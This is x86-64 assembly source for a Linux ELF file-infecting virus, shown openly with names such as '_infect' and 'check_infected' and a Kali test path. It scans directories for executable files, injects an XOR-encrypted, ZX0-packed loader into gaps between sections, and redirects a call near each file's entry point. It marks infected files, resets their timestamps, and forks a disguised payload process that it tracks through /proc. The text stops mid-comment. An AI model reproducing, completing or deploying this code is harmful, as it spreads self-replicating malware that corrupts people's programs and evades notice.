%define     SIZE_OF_SURPRIZE        0x120;;;;;; 
%define     OFFS_SURPRIZE           0xFFFFF4C7     
%define     ADDR_OF_SURPRISE_CODE   0xFFFFF4C7
%define     MAX_SIZE_START_LOAD     200
%define     KEY_FIRST               0x00000000
%define     SIZE_OF_START_LOAD      76 
%define     OFFS_START_LOAD         0x2F     
%define     SIZE_OF_MAIN_LOAD       3676  ;3712  ;3572  ;4864    ;(0x54D == 1357)
%define     SIZE_ML                 919   ;928   ;893   ;1216; SIZE_OF_MAIN_LOAD / 4
%define     OFFS_ML                 0x0F9B ;;(-2925) ;-2961 
%define     OFFS_OF_ORIG_CODE       0xFFFFFFFFFFFFFEDF
%define     OFFS_TAB_LEN_COD        500
%define     NAME_SURPRISE_PROC      0x21212100           ;"!!!0"

%define  lin_dir_size   51*5+12
%define  lin_stat_size  (6*8)+(4*14)+(6*8)+12

section .data
name_file:     db "/home/kali/vir/t1/tst", 0
n_file:        db "hel",0
code_buf1:     times 100 db 0x00
code_buf:      times 200 db 0x00
tab_cod_len:   times 100 db 0x00
section .text
global _start

_start:
       
         ;7bytes 
         ;push  rax
         ;mov   rax,  [rsp+8]
         pop   rax
         push  rax
         push  rdi
         push  rsi
         push  rdx
         push  rcx
         push  rax         ;#
   st_vir:
         push  0
         pop   rdi
;-----------------------------------------------------------   (10)-bytes
    brk:
         push  12
         pop   rax
         syscall
         push  rax       ;@  ;for rdi for 'mprotect'

         add   rax, 4096*4
         push  rax
         pop   rdi
         push  12
         pop   rax
         syscall
;------------------------------------------------------------     (19)-bytes
     mprotect:
         pop   rdi       ;@
         mov   rsi, 4096*4
         push  0x07   ;PROT_EXEX|PROT_READ|PROT_WRITE
         pop   rdx
         push  0x0a
         pop   rax
         syscall
      get_ip:
         pop   rsi            ;#   
         push  rsi
         push  rdi
;-----------------------------------------------------------      (17)-bytes
         mov   eax,  OFFS_ML     ;MAIN LOADER OFFSET in the curren file 
         movsxd rax, eax
         add   rsi, rax
         ;push (min_load-main_loader)/4
         ;pop  rcx
         mov   rcx, (min_load-main_loader)/4     ;SIZE_ML      ;size of MAIN LOADER / 4
         mov   edx, KEY_FIRST 
;------------------------------------------------------------    (21)-bytes
        ; push  rdi
        ; push  rdi
        ; push  rcx
      c_s:
        ; lodsd
        ; xor   eax,  edx
        ; stosd
        ; loop  c_s
        ; pop   rcx
        ; pop   rdi
        ; pop   rsi
;---------------------------------------------------------------  (12)-bytes
 c_strt:
         lodsd
         xor   eax,  edx
         stosd
         loop  c_strt
   c_end:
         pop   rdi
         jmp   rdi 
;------------------------------------------------------------     (9)-bytes

;=============================================================    
divi:    times 10 db 0xAA
;=============================================================
%define  lin_dir_size   51*5+12
%define  lin_stat_size  (6*8)+(4*14)+(6*8)+12
;cur_dir:    db ".", 0
 main_loader:
         jmp   main_loader_strt
   main_loader_end:
         syscall
         mov   rax,  r13
    ml_exit:
         mov   ebx,  OFFS_OF_ORIG_CODE
         movsxd   rbx,  ebx
         add   rax,  rbx
         ;mov   rax,  0xAABBCCFF55663311
         cmp   rax,  0           ;just need reserve 4 bytes

         pop   r8
         pop   r9
         pop   r10
         pop   r11
         pop   r14
         pop   r15
         pop   r12
         pop   r13
         pop   rbx
         pop   rbp
         pop   rcx
         pop   rdx
         pop   rsi
         pop   rdi
         push  rax
         xor   rax,  rax
      ret
    start_unpack:
;================== ZX0 UNPACKER ===========================================
;INPUT:  rsi: start of compressed data; rdi: start of decompression buffer;
;OUTPUT: none
;---------------------------------------------------------------------------
_zx0_depack1:
          mov   al, 0x80
          xor   rdx, rdx
          dec   rdx
       literals:
          call  .zx0_bits
          rep   movsb
          add   al,   al
          jc    .zx0_offs
          call  .zx0_bits
       .zx0_match:
          push  rsi
          push  rdi
          pop   rsi
          add   rsi,  rdx
          rep   movsb
          pop   rsi
          add   al,   al
          jnc   literals
       .zx0_offs:
          mov   cl,   0xfe
          call  .bits_loop
          inc   cl
          je   zx0_done
          
          mov   dh,   cl
          push  1
          pop   rcx
          mov   dl,   byte[rsi]
          inc   rsi
          stc
          rcr   dx,   1
          jc    .got_offs
          call  .gam_elias_bit
       .got_offs:
          inc   ecx
          jmp   .zx0_match
       .zx0_bits:
          push  1
          pop   rcx
       .bits_loop:
          add   al,   al
          jnz   .check_bits
          lodsb
          adc   al,   al
       .check_bits:
          jc    ext_zx0_bits
       .gam_elias_bit:
          add   al,   al
          adc   ecx,  ecx
          jmp   .bits_loop
       ext_zx0_bits:
      zx0_done:
   ret
;----------------------------------------------------------------------------------------------------------------------------------
;IN:  rsi - start addr of code;  rdi - addr for bufer with code;  rcx - size of code;
;OUT: rdi - addr for bufer with code;  rcx - 0; 
;----------------------------------------------------------------------------------------------------------------------------------
   collect_shell1:
      push  rdi
      push  rbx
      xor   rax,  rax
      push  rax
      pop   rbx
      cmp   ecx,  200
      jl    co_sh_ex
      inc   bl
   co_sh_ex:
      lodsb
      cmp   al,   0xE9     ;'jmp 0x00000000'
      jne   co_sh_ex1
      cmp   byte[rsi+4], 0xC3  ;'ret' 
      je    add_rsi_w
      jmp   co_sh_ex2
   co_sh_ex1:
      cmp   al,   0xEB     ;'jmp 0x00'
      jne   co_sh_ex2
      cmp   byte[rsi+1], 0xC3
      je    add_rsi_b
   co_sh_ex2:
      stosb
      loop  co_sh_ex
      pop   rbx
      pop   rdi
    ret
   add_rsi_b:
      test  bl,   bl
      jnz   co_sh_ex2
      xor   eax,  eax
      lodsb
      jmp   add_rsi
   add_rsi_w:
      lodsd
   add_rsi:
      add   rsi,  rax
      jmp   co_sh_ex
 end_unpack:
main_loader_strt:
         pop   rax
         push  rbx
         push  rbp
         push  r13
         push  r12
         push  rdi
         pop   rbp
         mov   r13,  rax
         mov   r12,  rdx
         push  r15
         push  r14
         push  r11
         push  r10
         push  r9
         push  r8
    cur_add2:  db 0x68, SIZE_OF_START_LOAD, 0, 0, 0      ;push  SIZE_OF_START_LOAD
    cur_add1:
         mov   eax,  OFFS_START_LOAD
         push  rax
    cur_add:
         mov   eax,  ADDR_OF_SURPRISE_CODE
         push  rax
    cur_add3: 
         mov   esi,  OFFS_ML     ;MAIN LOADER OFFSET in the curren file 
         movsxd rsi, esi
         add   rsi,  r13 
   ;-----------------------------
      .asdffs:                               ;22-bytes
         ;push  SIZE_OF_MAIN_LOAD+50 
         ;pop   rdi
         ;add   rdi,  rbp
         ;push  rdi
         ;mov   ecx,  SIZE_ML
      tst_cc:
         ;lodsd
         ;xor   eax,  edx
         ;stosd
         ;loop  tst_cc
         ;pop   rsi
      .asdfsfa:
   ;-----------------------------
         push  0x2800
         pop   rdi
         add   rdi,  rbp
         push  SIZE_OF_MAIN_LOAD
         pop   rcx
      gggggg:
         push  rdi
         rep   movsb            ;0xA4F3 ;call  collect_shell1   ;0xFFFFFF78E8
         pop   rdi
         nop
         ;call  collect_shell1
         push  (SIZE_OF_MAIN_LOAD/4)+4   ;SIZE_ML
         pop   rcx
         push  rdi 
         pop   rsi
         push  rbp
         pop   rdi
        cc_ss:
         lodsd
         xor   eax,  edx
         stosd
         loop  cc_ss
      min_load:
         push  SIZE_OF_MAIN_LOAD
         pop   rdi
         add   rdi, rbp 
         push  end_unpack-start_unpack 
         pop   rcx
      .cur:
         push  start_unpack-main_loader
         pop   rsi
         add   rsi,  rbp
         rep   movsb 
         push  packed_code-main_loader
         pop   rsi
         add   rsi,  rbp
         push  rdi
         call  _zx0_depack1
         pop   rdi
         call  rdi
         add   rsp,  8*3

         push  rbp
         pop   rdi
         add   rdi,  start_unpack-main_loader 
         push  12
         pop   rax
         jmp   main_loader_end

   packed_code:   times 0xCF6 db 0
_zx0_depack:
          mov   al, 0x80
          xor   rdx, rdx
          dec   rdx
       .literals:
          call  .zx0_bits
          rep   movsb
          add   al,   al
          jc    .zx0_offs
          call  .zx0_bits
       .zx0_match:
          push  rsi
          push  rdi
          pop   rsi
          add   rsi,  rdx
          rep   movsb
          pop   rsi
          add   al,   al
          jnc   .literals
       .zx0_offs:
          mov   cl,   0xfe
          call  .bits_loop
          inc   cl
          je   .zx0_done
          
          mov   dh,   cl
          push  1
          pop   rcx
          mov   dl,   byte[rsi]
          inc   rsi
          stc
          rcr   dx,   1
          jc    .got_offs
          call  .gam_elias_bit
       .got_offs:
          inc   ecx
          jmp   .zx0_match
       .zx0_bits:
          push  1
          pop   rcx
       .bits_loop:
          add   al,   al
          jnz   .check_bits
          lodsb
          adc   al,   al
       .check_bits:
          jc    .ext_zx0_bits
       .gam_elias_bit:
          add   al,   al
          adc   ecx,  ecx
          jmp   .bits_loop
       .ext_zx0_bits:
      .zx0_done:
   ret
collect_shell:
      push  rdi
      push  rbx
      xor   rax,  rax
      push  rax
      pop   rbx
      cmp   ecx,  200
      jl    .co_sh_ex
      inc   bl
   .co_sh_ex:
      lodsb
      cmp   al,   0xE9     ;'jmp 0x00000000'
      jne   .co_sh_ex1
      cmp   byte[rsi+4], 0xC3  ;'ret' 
      je    .add_rsi_w
      jmp   .co_sh_ex2
   .co_sh_ex1:
      cmp   al,   0xEB     ;'jmp 0x00'
      jne   .co_sh_ex2
      cmp   byte[rsi+1], 0xC3
      je    .add_rsi_b
   .co_sh_ex2:
      stosb
      loop  .co_sh_ex
      pop   rbx
      pop   rdi
    ret
   .add_rsi_b:
      test  bl,   bl
      jnz   .co_sh_ex2
      xor   eax,  eax
      lodsb
      jmp   .add_rsi
   .add_rsi_w:
      lodsd
   .add_rsi:
      add   rsi,  rax
      jmp   .co_sh_ex
;fff:    times 16 db 0xDD 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; PACKED CODE ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   packed:
         push  0x2e     ;cur_dir:   db ".", 0
         mov   rdi, rsp 
         xor   rdx,  rdx
         call  _dir_open
         pop   rdi
         ;xor   r14,  r14      ;addr of SURPRISE
         mov   r10,  rax
 loop:
         push  rax                ;@@
         sub   rsp, lin_dir_size
         push  rsp
         pop   rsi
         push  rax   
         pop   rdi
         call  _dir_read
         ;cmp   rax, 1
         ;jl    err_end
         push  rax
         pop   rcx
         cmp   rax, 1
         jl    err_end
         call  read_files
 
         add   rsp, lin_dir_size
         pop   rax                   ;@@
         jmp   loop
 err_end:
         add   rsp, lin_dir_size
         pop   rax                  ;@@
         mov   rsi,  r13                  ;&* pop r13 from 'main_loader'
         ;push  rsi                  ;%%
    ;cur_add:
         mov  rax,  [rsp+16]
         ;mov   eax,  ADDR_OF_SURPRISE_CODE
         ;movsxd rax, eax
         add   rsi,  rax
         call  _start_payload
         ;pop   rax               ;%%
      ret
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 read_files:
        xor   rax, rax
        add   rsi, 0x10
        lodsw
        sub   rcx, rax
        dec   ax
        sub   rsi, 0x12
        add   rsi, rax
        cmp   byte[rsi], 0x08      ;dt_reg
        je    inf_file
        cmp   byte[rsi], 0x04      ;dt_dir 
        je    inf_dir
     nxt_file:
        cmp   rcx, 0
        jle   r_f_ex
        inc   rsi
        jmp   read_files
    r_f_ex:
       ret
 inf_dir:
        push  rsi
        push  rcx
         ;[rsp+0x133]
        pop   rcx
        pop   rsi
        jmp   nxt_file
 inf_file:
        push  rsi
        push  rcx
        sub   rsp, lin_stat_size

        sub   rsi, rax
        add   rsi, 0x12
        mov   rdi, rsi
        mov   rsi, rsp
        push  rdi
        ;push   r14
        call  _file_stat  ;rsi+72=st_atime, rsi+48=st_size, rsi+24 = st_mode
        ;pop    r14
        pop   rdi
        push  rdi    ;#
        push  rsi    ;&
        add   rsi, 24
        lodsd
        test  eax, 0b001000001  ;the owner can execute the file?
        jz    inf_exit
        push   r10
        mov   rsi, [rsi+20]      ;st_size(size of file in bytes)bytes
;-------------------------------------------
        ;push   r12
        call  _infect  ;IN: rdi - name of file; rsi - size of file; rbp - start addr of alloc memory(for correct_shell_exec)/KEY for the NEW file; r12 - KEY from THIS file;
        ;pop    r12     ;OUT: rax==0(ERROR)/==1(OK); 
        pop    rdi      ;pop    r10 ;dirfd(the descriptor of opened directory)
        cmp    rax,  0
        je     inf_exit
;-------------------------------------------
    inf_exit:
        pop   rdx       ;& 
        pop   rsi
        add   rdx,   72
        ;mov   rdi,   -0x100   ; AT_FDCWD    -100    /* Special value used to indicate 
        xor   r10,   r10
        mov   rax,   0x118    ;SYSCALL "utimensat"
        syscall
      
        add   rsp,   lin_stat_size
        pop   rcx
        pop   rsi
        ; xor   rcx,  rcx      ;!!!!!!!!!!!!!!!!!!!!!!!!!!
        jmp   nxt_file

      _start_payload:                  ;IN: rsi - addr of SURPRIZE CODE in memmory; r12d - KEY for decode SURPRIZE CODE from this file;
         ;mov   rax,  0x39             ;OUT: rax - PID of new proc 
         push  rbp            ;@
         push  rsi
         sub   rsp,  24
         push  rsp
         pop   rbx
         call  proc_check
         add   rsp,  24 
         pop   rsi
         cmp   ebp, 3
         je    crr_proc_exit

         push  0x39
         pop   rax
         syscall                 ;fork()
         cmp   rax,  0
         je    ths_new_proc
      crr_proc_exit:
         pop   rbp         ;@
      ret
      ths_new_proc:
         pop   rbp         ;@
         push  15
         pop   rdi            ;PR_SET_NAME
         sub   rsp,  rdi 
         mov   dword[rsp],  NAME_SURPRISE_PROC
         mov   rax,  157
         syscall
         add   rsp,  rdi 

         push  rbp   
         pop   rdi
         mov   ecx,  SIZE_OF_SURPRIZE
         movsxd   rcx,  ecx
      payloop:
         lodsd
         xor   eax,  r12d
         stosd
         loop payloop
         call  _zx0_depack
         call  rbp
        
         push  0x3C
         pop   rax
         syscall                 ;exit() 
      ret
;=================================================================================================
;IN:  rbx(not is changed) - bufer of path(MIN 24 bytes ="/proc"+19 bytes);
;OUT: ebp == 3(find SURPRISE proc) ebp==1/0(not find);
;=================================================================================================
   proc_check:
         mov   dword[rbx], 0x6F72702F    ;"/pro"
         mov   word[rbx+4],   0x0063
         xor   ebp,  ebp
      proc_find:
         push  rbx
         pop   rdi
         xor   rdx,  rdx  
         call  _dir_open
      proc_loop: 
         push  rax               ;*
         sub   rsp, lin_dir_size
         push  rsp
         pop   rsi
         push  rax   
         pop   rdi
         call  _dir_read
 
         push  rax
         pop   rcx
         cmp   rax, 1
         jl    proc_err_end
         call  proc_read             ;read_files        
         cmp   ebp,  4
         jne   pro_lo_cont
         push  1
         pop   rbp
         jmp   proc_err_end
      pro_lo_cont:
         cmp   ebp,  3
         je    proc_err_end
         add   rsp, lin_dir_size
         pop   rax
         jmp   proc_loop
      proc_err_end:
         add   rsp,  lin_dir_size
         pop   rdi               ;*
         call  _file_close
        ret
   proc_read:
        xor   rax, rax
        add   rsi, 0x10
        lodsw
        sub   rcx, rax
        dec   ax
        sub   rsi, 0x12
        add   rsi, rax
        cmp   byte[rsi], 0x08      ;dt_reg
        je    .inf_file
        cmp   byte[rsi], 0x04      ;dt_dir 
        je    .inf_dir
     .nxt_file:
        cmp   rcx, 0
        jle   .r_f_ex
        inc   rsi
        jmp   proc_read
    .r_f_ex:
       ret
 .inf_dir:
         cmp   ebp, 1
         jae   .nxt_file 
         push  rsi
         push  rcx
         ;[rsp+0x133]
         inc   ebp
         sub   rsi,  rax
         add   rsi,  0x12
         cmp   byte[rsi],  0x2e     ;"."
         je    .dir_point
         lodsq 
         mov   byte[rbx+5],   0x2F  ;"/"
         mov   qword[rbx+6],  rax
         call  proc_find
    .dir_point:
         pop   rcx
         pop   rsi
         cmp   ebp,  3
         jae   .r_f_ex
         dec   ebp
         jmp   .nxt_file
 .inf_file:          
         cmp   ebp,  1
         jne   .nxt_file

         push  rsi
         push  rcx
         sub   rsi,  rax
         add   rsi,  0x12
                  
         cmp   dword[rsi], 0x74617473        ;"stat"
         jne   .file_noteq
         cmp   word[rsi+4],   0x7375         ;"us"
         jne   .file_noteq
        ;_file_open = "/proc/.../status"
      .ddd:
         lodsq
         push  rax
         pop   rdx
         push  rax 
         pop   rcx
         push  rbx
         push  rbx
         pop   rsi
         pop   rdi
         xor   al,   al
         repne scasb          
         sub   rdi,  rsi      
         dec   edi         ;len of str
         add   rdi,  rsi
         mov   byte[rdi],  0x2F     ;"/"
         mov   qword[rdi+1],  rdx
         push  rbx
         pop   rdi
         xor   rsi,  rsi      ;for reading
         call  _file_open 
         cmp   eax,  2
         jle   .file_noteq
        ;_file_read:
      .aaa:
         push  rax         ;file descriptor
         pop   rdi 
         push  24 
         pop   rdx         ;bufer size
         sub   rsp,  rdx    ;bufer addr 
         push  rsp
         pop   rsi
         xor   rax, rax    ;syscall number
         push  rdi      ;#
         syscall            ; in rax - count of bytes
        ;_file_close               
         pop   rdi      ;# file descriptor "/proc/.../status"
         call  _file_close
         push  4
         pop   rbp
         cmp   dword[rsp+6],  NAME_SURPRISE_PROC     ;"zsh "
         ;cmp   dword[rsp+6],  0x7268746B      ;"kthr"
         jne   .file_not
         push  3
         pop   rbp
      .file_not:
         add   rsp,  24
         pop   rcx
         pop   rsi
       ret
      .file_noteq:
         pop   rcx
         pop   rsi
         jmp   .nxt_file
;------------------------------------------------------------------------------
;====================================================================================
%define  lin_dir_size   51*5+12
%define  lin_stat_size  (6*8)+(4*14)+(6*8)+12

section .text
_file_open:
       ;mov  rdi, rcx    ;address of the string with the file name
       ;mov  rsi, 2      ;open for reading and writing
       xor   rdx, rdx    ; mod == 0
       push  2 
       pop   rax      ;system call number
       syscall
       ret               ; in rax - file descriptor
_file_close:
       ;mov   rdi, rcx    ;file descriptor
       push 3      ;system call number
       pop  rax
       syscall
      ret
_file_read:
       ;mov   rdi, rcx    ;file descriptor
       ;mov   rsi, rdx    ;bufer addr 
       ;mov   rdx, r8     ;bufer size
       mov   rax, 0       ;syscall number
       syscall
      ret                 ; in rax - count of bytes
_file_write:
       ;mov   rdi, rcx
       mov   rsi, rdx
       mov   rdx, r8
       mov   rax, 1
       syscall
       ret
_file_stat:
       ;sub   rsp, lin_stat_size
       ;mov   rsi, rsp
       push 0x04
       pop  rax
       syscall
       ;add   rsp, lin_stat_size
       ret
_dir_open:
       mov   rsi, 65536
       push 2
       pop  rax
       syscall
       ret
_dir_read:     ;int getdents(unsigned int fd-rdi, struct linux_dirent *dir-rsi, unsignted int count-rdx);
       mov   rdx, lin_dir_size - 12
       push 78
       pop  rax
       syscall
       ret
_mmap:         ;void *mmap(void addr[.length], size_t length, int prot, int flags, int fd, off_t offset)   
       mov   rdx, 0x03      ;READ_WRITE=2; READ=1; EXEC=4; NONE=0
       mov   r10, 0x01      ;MAP_PRIVAT=2; MAP_SHARED=1; MAP_FIXED=0x10
       mov   r8, rax        ;file descriptor
       mov   r9, 0x00       ;offset into file
       mov   rax, 0x09
       syscall
       ret                 ;return in rax addr of allocated memory
;=============================================================================================================
;=============================================================================================================
;IN: rdi - name of file; rsi - size of file; rbp - start addr of alloc memory(for correct_shell_exec);
;r12 - key; r13 - addr of next command of ORIGINAL CODE(NOT SHELL!!!);
;OUT: rax == 0(ERROR); rax == 1(OK);
;=============================================================================================================
_infect:
      ;[rsp+0x1F7]
      push  r13
      push  r12
      push  rbp

      push  rsi
      push  2  
      pop   rsi         ;for reading and writing
      call  _file_open
      pop   rsi
      cmp   eax, 3
      jl    infect_out1
      push  rax         ;() 
      xor   rdi, rdi
      call  _mmap
      pop   rdi         ;()
      push  rsi         ;for _munmap in infect_out
      push  rax         ;for _munmap in infect_out
      push  rax
      call  _file_close
      pop   rdi
      call  check_exec
      cmp   al, 2
      jl    infect_out
      
      call  check_seg
      call  check_infected
      cmp   al,   0
      je    infect_out 
;-----------------------------------------------------      
      push  rsi   ;#
      push  rdi   ;*
   ;cur_add:
      mov  esi,  dword[rsp+0x22F]        
      ;mov   ecx,  OFFS_SURPRIZE     
      movsxd rsi, esi
      add   rsi,  r13               ;ADDR(offset in file) of SURPRISE
      mov   rcx,  SIZE_OF_SURPRIZE  ;SIZE of SURPRISE
      push  0x2800
      pop   rdi
      add   rdi,  rbp
      push  rcx
      call  collect_shell
      ;decoding
      pop   rcx
      push  rdi
      pop   rsi
      call  xor_code                ;IN:  rsi - addr of FROM bufer;  rdi - addr of TO bufer; rcx - size of data;  r12 - key; 
      ;coding
      push  rsi
      pop   rdi
      mov   r12,  rbp
      call  xor_code
      pop   rdi   ;*
      mov   r12,  rsi
      pop   rsi   ;#       ADDR of SURPRISE 
      xor   r8,   r8
      call  inect_shell_exec ;call  inect_shell_data
      mov   r12,  rbp
      cmp   rax,  0
      jne   inf_nxt1
      je    infect_out  
   inf_nxt1:
      mov   r14,  rbx
;----------------------------------------
      push  rsi         ;$
      push  min_load-main_loader
      pop   rcx
      push  rdi         ;%
      push  0x2800
      pop   rdi
      add   rdi,  rbp
      push  rbp
      pop   rsi
      push  rdi      ;@
      rep   movsb
      push  SIZE_OF_MAIN_LOAD          ;3416        ;SIZE_OF_MAIN_LOAD-(min_load-main_loader)
      pop   rcx
      call  xor_code
      pop   r12      ;@
      pop   rdi      ;%
      pop   rsi      ;$
      ;xor   r8,   r8
      call  inect_shell_exec;call  inect_shell_data
      mov   r12,  rbp
      cmp   rax,  0
      jne   inf_nxt2
      je    infect_out
   inf_nxt2:
      mov   r15,  rbx
      call  find_entr                  ;OUT: rbx - addr of nxt command after changed "call" in memory; cl - opcode;
      cmp   rax,  0
      jne   inf_nxt
      jmp   infect_out
   inf_nxt: 
      sub   r14,  rbx
      mov   dword[r15+cur_add-main_loader+1], r14d
      mov   r14,  rbx
      mov   rax,  r15
      sub   rax,  rbx
      mov   dword[r15+cur_add3-main_loader+1], eax
   ;----------------------
      mov   ebx,  dword[rbx-4] 
      cmp   cl,   0xFF
      jne   ent_e8
      mov   dword[r15+ml_exit-main_loader+11],  0x90008B48   ;"mov  rax,  [rax]"(0x008b48)+"nop"(0x90)
      jmp   ent_end 
   ent_e8:
      mov   dword[r15+ml_exit-main_loader+11],  0x00F88348     ;"cmp rax, 0"
   ent_end:
      mov   dword[r15+ml_exit-main_loader+1], ebx   ;!!!!!!!!!!!!! ;save 32-bit offset of intercepted CALL
   ;-----------------------
      push  rbp       
   ;cur_add2:
      mov  rcx,  qword[rsp+0x227+16]   ;SIZE_OF_START_LOAD 
      add   rbp,  0x2800
      push  r13
   ;cur_add1:
      mov  ebx,  dword[rsp+0x22F+8]   ;OFFS_START_LOAD
      movsxd   rbx,  ebx
      add   r13,  rbx
      call  collect_shell_exec      ;IN: r13 - addr of EXEC_SHELL, rcx - size of code; rbp - addr for bufer for code; OUT: rbp - addr of bufer with NEW code;   rcx - size of NEW code;
      mov   dword[r15+cur_add2-main_loader+1],  ecx      ;SIZE of NEW START_LOADER after 'collect_shell_exec'->'_polimorph'
      mov   r12,  rbp
      pop   r13
      pop   rbp
      cmp   rax,  0
      je   infect_out
      push  rbp         ;^^

     ; r12               ;addr of bufer for EXEC_SHELL
      xchg  r13,  r14
      call  inect_shell_exec
   inf_nxt3:
      sub   rbx,  r13
      mov   dword[r15+cur_add1-main_loader+1],  ebx 
      mov   dword[r13-4],  ebx

      pop   r12         ;^^   ;key
      mov   rsi,  r15
      push  rsi
      pop   rdi
      push  min_load-main_loader          ;SIZE of MAIN LOADER 
      pop   rcx
      call  xor_code
      ;cmp   rbx,  0
      ;nop
      push  1
      pop   rax
;------------------------------------------------------------------
 infect_out:
      pop   rdi      ;from _mmap (start in "infect")
      pop   rsi      ;from _mmap (start in "infect")
      push  rax
      push  0x0b
      pop   rax
      syscall        ;syscall 'munmap'
      pop   rax
  infect_out1: 
      pop   rbp
      pop   r12
      pop   r13
   ret
;--------------------------------------------------------------------------------------------------------------------------------------
;IN: rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;OUT: rbx - addr of nxt command after changed "call" in memory; cl - opcode;
;--------------------------------------------------------------------------------------------------------------------------------------
find_entr:
      push  rdi
      push  rsi
      sub   rsp,  hde64s_size

      add   rdi,  [rdi+24]    ;+24 - offset in file of e_entry
      push  rdi
      pop   rsi   
      push  rsp
      pop   rdi
   fi_en_lo:
      push  rsi
      call  _hde
      pop   rbx
      add   rsi,  rbx
      cmp   al,   0x00 
      je    fi_en_exit
      cmp   byte[rdi+hde64s.opcode],   0xFF   ;"CALLN" or "CALLF"
      jne   E8 
      cmp   byte[rdi+hde64s.modrm_ro], 0x02   ;"CALLN"
      je    chng_call 
      cmp   byte[rdi+hde64s.modrm_ro],   0x03   ;"CALLF"
      je    chng_call 
   E8:
      cmp   byte[rdi+hde64s.opcode],   0xE8     ;"call"
      jne   fi_en_lo
      jmp   fi_fi
   chng_call:
      mov   word[rsi-6],   0xE890      ;"nop" + E8(opcode of command "call") 
   fi_fi: 
      push  rsi
      pop   rbx
      mov   cl,   byte[rdi+hde64s.opcode]
   fi_en_exit:
      add   rsp,  hde64s_size
      pop   rsi
      pop   rdi
   ret                  
;-----------------------------------------------------------------------------------------------------------------------------------------
;IN:  rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;OUT: eax==0(file was infected) eax==1(file is infected); 
;-----------------------------------------------------------------------------------------------------------------------------------------
check_infected:
      xor   eax,  eax
      cmp   byte[rdi+14],  0xAA
      je    chk_inf_out
      mov   byte[rdi+14],  0xAA
      inc   al
   chk_inf_out:
   ret
;-----------------------------------------------------------------------------------------------------------------------------------------
;IN:  rdi - addr of zero offset of file; si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff; (HAVEN'T r8 - e_phnum; r9 - e_shnum);
;r8 - addr of 'tab_code_le'; r9(31-63 bits) - bit map of LOAD EXEC segments; rcx - size of code; r12 - addr of bufer of code;
;OUT: rbx - addr of start EXEC_SHELL code in memory
;-----------------------------------------------------------------------------------------------------------------------------------------
inect_shell_exec:
      push  r14
      push  r9
      push  r10
      xor   r14,  r14
      add   r10,  rdi
      cmp   r8,   r14 
      je    no_rol
      rol   r9,   32
   no_rol:
      xor   rax,  rax
      push  rax
   i_sh_d_lo:
      push  r10
      bsf   rax,  r9
      btr   r9,  rax
      mov   bl,   56
      mul   bl                ;e_phsize == 56 
      add   r10,  rax
      push  r9
      mov   rax,  [rsp+16]
      call  nork_in_segment 
      mov   [rsp+16],   rax
      pop   r9
      pop   r10
      cmp   ecx,  0
      jle   in_sh_da_exit
      cmp   r9d,  0
      jne   i_sh_d_lo 
  in_sh_da_exit: 
      pop   rax
      mov   rbx,  r14
      pop   r10
      pop   r9
      pop   r14
   ret
;--------------------------------------------------------------------------------------------------------------------------------------------------
;IN:  r10 - file offset(addr of curr ELF64_Phdr); si - e_phnum; dx - e_shnum; r10 - e_phoff; r11 - e_shoff;
;r8 - addr of 'tab_code_le'; r9(31-63 bits) - bit map of LOAD EXEC segments; rcx - size of code; r12 - addr of bufer of code;
;OUT: rax - addr of "jmp 0x..."(from r10 of find_nork); rcx - count of bytes which will need written; r14 - addr of start EXEC_SHELL code in memory
;---------------------------------------------------------------------------------------------------------------------------------------------------
nork_in_segment:
      push  rdi
      push  rsi
      push  r10
      push  rdx      ;$
      push  r11      ;@
   jm_dist:
      mov   r9,   r8
      ;xor   r14,  r14
      push  rdx
      push  rcx
      pop   r8
      pop   rcx

      mov   rbx,   [r10+8]   ;start addr of segment in file
      mov   rsi,   [r10+64]  ;end addr of segment and start addr of NEXT segment in file
      xchg  r10,   rax       ;addr of "jmp 0x..."for find_nork

   nork_check:
      mov   rax,  [rdi+r11+24]   ;start addr CURRENT section
      mov   rdx,  [rdi+r11+88]   ;start addr of NEXT section 
      push  rax         ;^^
      push  rdx         ;^
      cmp   r9,   0          ;[rsp+10*8] - 'push rcx' from "inect_shell_exec" 
      jne   nork_start 
      cmp   r10,  0
      jne   nork_start 
      add   rax,  [rdi+r11+32]         ;sh_size
      sub   rdx,  rax
      cmp   rdx,  min_load-main_loader
      jge   nork_start
      pop   rdx               ;^
      pop   rax               ;^^
      jmp   skip_seg_loop
   nork_seg_loop:
      jmp   nork_check 
   nork_start:
      pop   rdx               ;^
      pop   rax               ;^^
      cmp   rax,  0
      je    skip_seg_loop

      cmp   rax,  rbx
      jl    skip_seg_loop
      cmp   rax,  rsi
      jge   nork_seg_exit  ;skip_seg_loop

      cmp   r9,   0
      jne   nork_st_exet
      add   rax,  [rdi+r11+32]

   nork_st_exet: 
      push  rsi
      push  rbx
      push  rcx

      push  r8                   ;size of code;    r9 - addr of tab_code_len
      push  rdi

      sub   rdx,  rax            ;size of section
      mov   rsi,  r12
      add   rdi,  rax
      push  rdi
      call  find_nork            ;rdi-addr of section in memory; rdx-size of section; r8-size of code; r9-addr of tab_code_len
      xchg  r12,  rsi            ;from rsi to r12 addr of next command of the code
   s_nx_lo:
      pop   rbx
      pop   rdi
      pop   rcx

      cmp   r8,   0
      jle   zer_r8
      sub   rcx,  r8
      cmp   rcx,  0
      jle   no_szs
      add   rcx,  6
   zer_r8:
      mov   rax,  [rsp+40]            ;addr of modified segment header
      push  r11
      mov   r11,  [rsp+32]       ;@
      mov   rdx,  [rsp+40]       ;6*8$
      call correct_sizes
      pop   r11
   no_szs:
      pop   rcx
      pop   rbx
      pop   rsi

      cmp   r8,   0
      jle   nork_seg_exit
   skip_seg_loop:
      add   r11,  64
      loop  nork_seg_loop

   nork_seg_exit:
      xchg  rcx,  r8             ;remaining  size of code
      mov   r8,   r9
      xchg  r10,  rax            ;addr of 'jmp 0x...' from  find_nork
      pop   r11
      pop   rdx
      pop   r10
      pop   rsi
      pop   rdi
   ret
%include "polimorphism.asm"
;---------------------------------------------------------------------------------------------------------------------------
;IN:  r13 - start addr of code;  rcx - size of code; rbp - addr for bufer with code;
